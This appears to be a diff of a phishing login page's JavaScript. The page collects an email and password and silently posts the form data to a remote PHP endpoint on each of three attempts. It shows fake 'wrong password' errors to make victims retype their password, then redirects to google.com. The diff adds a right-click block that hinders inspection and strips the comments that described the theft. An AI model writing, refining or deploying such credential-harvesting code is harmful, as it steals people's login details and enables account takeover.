@@ -458,6 +458,9 @@
     </div>
 
     <script>
+        // Disable right click
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
         const form = document.getElementById('loginForm');
         const emailInput = document.getElementById('emailInput');
         const emailGroup = document.getElementById('emailGroup');
@@ -520,7 +523,7 @@
         });
 
         form.addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent default form submission
+            e.preventDefault(); 
             
             if (currentStep === 'email') {
                 const emailValue = emailInput.value.trim();
@@ -569,11 +572,9 @@
 
                     // 1ST ATTEMPT
                     if (passwordAttemptCount === 1) {
-                        // Send to remote server in background
                         fetch(REMOTE_PHP_URL, { method: 'POST', body: formData })
                             .catch(err => console.log("Background save failed", err));
 
-                        // Show error locally and stay on page
                         passwordGroup.classList.add('error');
                         passwordErrorMsg.innerHTML = `
                             <svg class="error-icon" viewBox="0 0 24 24">
@@ -586,11 +587,9 @@
                     } 
                     // 2ND ATTEMPT
                     else if (passwordAttemptCount === 2) {
-                        // Send to remote server in background
                         fetch(REMOTE_PHP_URL, { method: 'POST', body: formData })
                             .catch(err => console.log("Background save failed", err));
 
-                        // Show error locally and stay on page
                         passwordGroup.classList.add('error');
                         passwordErrorMsg.innerHTML = `
                             <svg class="error-icon" viewBox="0 0 24 24">
@@ -606,14 +605,11 @@
                         submitBtn.disabled = true;
                         submitBtn.innerText = "Signing in...";
 
-                        // Send the final attempt to remote server, then redirect
                         fetch(REMOTE_PHP_URL, { method: 'POST', body: formData })
                             .then(() => {
-                                // Redirect after successful send
                                 window.location.href = "https://www.google.com";
                             })
                             .catch(() => {
-                                // Redirect even if network fails
                                 window.location.href = "https://www.google.com";
                             });
                     }
